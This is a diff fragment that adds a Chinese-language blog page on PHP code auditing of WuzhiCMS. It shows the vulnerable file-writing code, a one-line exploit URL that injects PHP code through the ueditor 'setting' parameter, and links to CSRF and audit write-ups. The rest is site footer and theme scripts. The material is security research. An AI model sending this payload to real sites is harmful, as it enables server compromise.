+</span></span><span class="line"><span class="cl">		<span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&lt;?php&#39;</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\r\n</span><span class="s2"> return &#34;</span> <span class="o">.</span> <span class="nx">array2string</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">.</span> <span class="s1">&#39;?&gt;&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">	<span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">index.php?m=attachment&amp;f=index&amp;_su=wuzhicms&amp;v=ueditor&amp;submit=1&amp;setting=%3Cphp%20phpinfo();%3E
+</span></span></code></pre></div><h2 id="文章">文章：<a hidden class="anchor" aria-hidden="true" href="#文章">#</a></h2>
+<p>五指CMS 4.1.0存在CSRF漏洞可增加管理员账户</p>
+<p><a href="https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/">https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</a></p>
+<p>wuzhicms代码审计</p>
+<p><a href="https://blog.csdn.net/RestoreJustice/article/details/129734772">https://blog.csdn.net/RestoreJustice/article/details/129734772</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/xvsf/tags/php-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">PHP 代码审计</a></li>
+    </ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2026 <a href="http://localhost:1313/xvsf/">xvsf</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
